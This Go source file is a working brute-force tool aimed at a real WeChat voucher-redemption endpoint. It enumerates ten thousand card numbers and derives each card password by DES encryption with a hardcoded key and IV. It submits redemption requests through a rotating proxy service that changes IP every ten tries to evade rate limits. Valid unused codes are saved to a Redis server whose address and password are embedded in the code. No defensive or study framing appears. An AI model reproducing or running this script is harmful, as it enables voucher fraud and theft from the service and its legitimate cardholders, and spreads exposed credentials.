package main

import (
	"encoding/json"
	"github.com/agclqq/goencryption"
	"github.com/go-redis/redis"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

const (
	key = "qAfmGitJ"
	iv  = "12345678"
)

type RespBody struct {
	ErrorCode int         `json:"errorCode"`
	ErrorMsg  string      `json:"errorMsg"`
	Expire    interface{} `json:"expire"`
}

type IPResp struct {
	Data []struct {
		IP   string `json:"ip"`
		Port int    `json:"port"`
	} `json:"data"`
}

var (
	uuid     string
	respBody RespBody
	ipResp   IPResp
)

func main() {

	rd := rds()
	changeIP()

	t := 0
	for cardId := 7847820000; cardId <= 7847829999; cardId++ {
		getUUID()
		pwd := DesEnc(cardId)
		Go(pwd, rd, cardId)
		t++
		if t%10 == 0 {
			changeIP()
		}
	}

}

func DesEnc(c int) string {
	cryptText, err := goencryption.DesCBCPkcs7Encrypt([]byte(strconv.Itoa(c)), []byte(key), []byte(iv))
	if err != nil {
		log.Fatal("加密失败")
	}
	return goencryption.Base64Encode(cryptText)
}

func getUUID() {
	resp, _ := http.Get("https://wechat.chengquan.cn/entry/brandUnify/index/3085/750")
	defer resp.Body.Close()
	resText, _ := ioutil.ReadAll(resp.Body)
	res := string(resText)
	pos := strings.Index(res, "uuid\" value=\"")
	uuid = res[pos+13 : pos+58]
}

func Go(p string, rd *redis.Client, j int) {
	proxy, _ := url.Parse("http://" + ipResp.Data[0].IP + ":" + strconv.Itoa(ipResp.Data[0].Port))
	client := &http.Client{
		Transport: &http.Transport{Proxy: http.ProxyURL(proxy)},
	}
	var data = strings.NewReader(`userId=3085&configId=750&uuid=` + uuid + `&designType=CODE_PHONE&cardPwd=` + p + `&account=15607883659`)
	req, _ := http.NewRequest("POST", "https://wechat.chengquan.cn/entry/brandUnify/exchange", data)
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1")
	resp, _ := client.Do(req)
	defer resp.Body.Close()
	bodyText, _ := io.ReadAll(resp.Body)
	json.Unmarshal(bodyText, &respBody)
	log.Println("卡号：", j, respBody)
	if respBody.ErrorMsg == "兑换码无效" {
		return
	}
	//if respBody.ErrorCode == 9999 {
	//	changeIP()
	//	return
	//}
	if respBody.ErrorMsg != "兑换码已使用" {
		rd.SAdd("万达", j)
	}
}

func changeIP() {
	resp, _ := http.Get("http://zltiqu.pyhttp.taolop.com/getip?count=1&neek=60338&type=2&yys=0&port=1&sb=&mr=2&sep=0&ts=1&ys=1&cs=1")
	defer resp.Body.Close()
	text, _ := ioutil.ReadAll(resp.Body)
	json.Unmarshal(text, &ipResp)
	log.Println("更换IP：", ipResp)
}

func rds() *redis.Client {
	rdb := redis.NewClient(&redis.Options{Addr: "175.27.243.243:6379", Password: "213879", DB: 0})
	return rdb
}
